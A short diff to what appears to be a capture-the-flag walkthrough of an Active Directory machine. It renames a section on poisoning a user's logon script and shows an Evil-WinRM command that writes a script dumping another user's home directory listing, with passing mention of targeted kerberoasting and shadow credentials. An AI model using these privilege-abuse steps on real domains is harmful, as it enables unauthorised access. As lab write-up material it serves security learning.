@@ -432,7 +432,7 @@ GenericWrite on `maria`
 
 A targeted kerberoast attack does not work and shadow credentials dont either
 
-# Poisoning the logon script
+# Accessing `maria` home directory
 
 ```python
 *Evil-WinRM* PS C:\Users\smith\Documents> echo "dir \users\maria\ > \programdata\content" > maria.ps1
@@ -457,3 +457,4 @@ d-----        8/25/2021   2:57 AM                VMware
 
 *Evil-WinRM* PS C:\Users\smith\Documents> 
 ```
+
